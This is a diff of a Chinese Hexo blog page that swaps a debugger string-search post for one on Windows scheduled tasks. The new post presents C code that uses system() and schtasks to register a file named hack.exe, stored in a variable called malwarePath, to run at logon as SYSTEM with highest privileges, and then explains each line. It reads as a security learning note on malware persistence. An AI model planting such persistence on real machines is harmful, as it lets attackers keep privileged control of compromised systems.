@@ -22,7 +22,7 @@
 
   
 
-  <title>字符串搜索 | Hexo</title>
+  <title>计划任务 | Hexo</title>
 
   
 
@@ -93,17 +93,12 @@
     <div class="header-content">
       <div class="post-text layout-block">
         <div class="layout-margin">
-          <h1 class="title-wrap">字符串搜索</h1>
+          <h1 class="title-wrap">计划任务</h1>
           <h2 class="title-sub-wrap">
             <strong>John Doe</strong>
             <span>发布于</span>
-            <time  class="article-date" datetime="2024-10-15T03:13:19.000Z" itemprop="datePublished">2024-10-15</time>
+            <time  class="article-date" datetime="2025-04-01T03:13:19.000Z" itemprop="datePublished">2025-04-01</time>
           </h2>
-          
-            <h2 class="last-time">
-              <span>最后更新于</span>
-              <time  class="article-updated" datetime="2024-10-16T06:30:13.088Z" itemprop="dateUpdated">2024-10-16</time>
-            </h2>
           
           
           <ul class="wrap-list dark">
@@ -111,7 +106,7 @@
 </ul>
           <ul class="wrap-list dark">
   
-    <li><a href="/tags/%E9%80%86%E5%90%91/">🏷️ 逆向</a></li>
+    <li><a href="/tags/c%E4%BB%A3%E7%A0%81/">🏷️ c代码</a></li>
   
 </ul>
         </div>
@@ -137,17 +132,22 @@
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
         <h3 id=""><a href="#" class="headerlink" title=""></a></h3><span id="more"></span>
 
+<p><strong>计划任务</strong> 是 Windows 系统中一种用于在指定时间执行特定操作的功能。通过计划任务功能，您可以在当前窗口或其他对话框中设置一个定时任务，该任务将在未来某个时刻自动启动并执行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    // task</span><br><span class="line">    const char* taskName = &quot;MeowTask&quot;;</span><br><span class="line">    const char* malwarePath = &quot;C:\\Users\\admin\\Desktop\\test\\hack.exe&quot;;</span><br><span class="line">    char command[512];</span><br><span class="line"></span><br><span class="line">    snprintf(command, sizeof(command),</span><br><span class="line">        &quot;schtasks /create /tn \&quot;%s\&quot; /tr \&quot;%s\&quot; /sc onlogon /ru SYSTEM /rl highest /f&quot;,</span><br><span class="line">        taskName, malwarePath);</span><br><span class="line">    system(command);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="分步解释："><a href="#分步解释：" class="headerlink" title="分步解释："></a>分步解释：</h3><p><strong>变量声明和初始化</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">const char* taskName = &quot;MeowTask&quot;;</span><br><span class="line">const char* malwarePath = &quot;C:\\Users\\admin\\Desktop\\test\\hack.exe&quot;;</span><br><span class="line"></span><br><span class="line">定义了两个字符数组taskName和malwarePath，分别赋值为&quot;MeowTask&quot;和&quot;C:\Users\admin\ Desktop\test\hack.exe&quot;。这些变量用于构建命令字符串。</span><br></pre></td></tr></table></figure>
+
+<p><strong>snprintf函数的使用</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    snprintf(command, sizeof(command),</span><br><span class="line">        &quot;schtasks /create /tn \&quot;%s\&quot; /tr \&quot;%s\&quot; /sc onlogon /ru SYSTEM /rl highest /f&quot;,</span><br><span class="line">        taskName, malwarePath);</span><br><span class="line">        </span><br><span class="line">使用snprintf函数将taskName和malwarePath插入到命令字符串中，生成完整的schtasks指令。</span><br><span class="line">命令格式为：&quot;schtasks /create /tn &quot;%s&quot; /tr &quot;%s&quot; /sc onlogon /ru SYSTEM /rl highest /f&quot; 其中，</span><br><span class="line">/create：创建新的Scheduled Task。</span><br><span class="line">/tn &quot;%s&quot;：指定任务名称，使用%替换占位符位置。</span><br><span class="line">/tr &quot;%s&quot;：指定任务路径（恶意文件hack.exe）。</span><br><span class="line">其他参数描述了任务的执行方式和权限。</span><br></pre></td></tr></table></figure>
+
+<p><strong>调用system函数</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">system(command);</span><br><span class="line">将构造后的命令字符串传递给system函数，用于在后台执行schtasks /create命令。</span><br><span class="line">system函数会将命令作为批处理脚本运行。</span><br></pre></td></tr></table></figure>
 
 
-<p><strong>工具配置</strong></p>
-<p>1.确保程序入口点</p>
-<p><img src="/2024/07/15/IPv4%E5%8A%A0%E5%AF%86/01.jpg" alt="1"></p>
-<p>2.把程序拖入dbg中，运行程序</p>
-<p><img src="/2024/07/15/IPv4%E5%8A%A0%E5%AF%86/02.jpg" alt="1"></p>
-<p><img src="/2024/07/15/IPv4%E5%8A%A0%E5%AF%86/05.jpg" alt="1"></p>
-<p>3.右键搜索-&gt;当前模块-&gt;字符串</p>
-<p><img src="/2024/07/15/IPv4%E5%8A%A0%E5%AF%86/03.jpg" alt="1"></p>
-<p><img src="/2024/07/15/IPv4%E5%8A%A0%E5%AF%86/04.jpg" alt="1"></p>
+
+<h3 id="运行代码："><a href="#运行代码：" class="headerlink" title="运行代码："></a>运行代码：</h3><p><img src="/2024/07/15/IPv4%E5%8A%A0%E5%AF%86/jpg" alt="1"></p>
+<p><img src="/2024/07/15/IPv4%E5%8A%A0%E5%AF%86/jpg" alt="1"></p>
 
       </section>
 
@@ -155,28 +155,14 @@
       
         <nav class="article-nav">
           
-            <div class="article-nav-item layout-padding">
-  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
-    
-    <div class="card-text">
-      
-        <a href="/2024/10/15/%E6%9E%9A%E4%B8%BE%E8%BF%9B%E7%A8%8B/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">枚举进程</h2>
-        </a>
-      
-      <div class="card-text--row">Newer</div>
-    </div>
-  </article>
-</div>
-          
           
             <div class="article-nav-item layout-padding">
   <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
     
     <div class="card-text">
       
-        <a href="/2024/10/14/Windows%20Shellcode%E5%AD%A6%E4%B9%A0/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">Windows Shellcode学习</h2>
+        <a href="/2025/03/16/%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2deepseek/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">本地部署deepseek</h2>
         </a>
       
       <div class="card-text--row">Older</div>
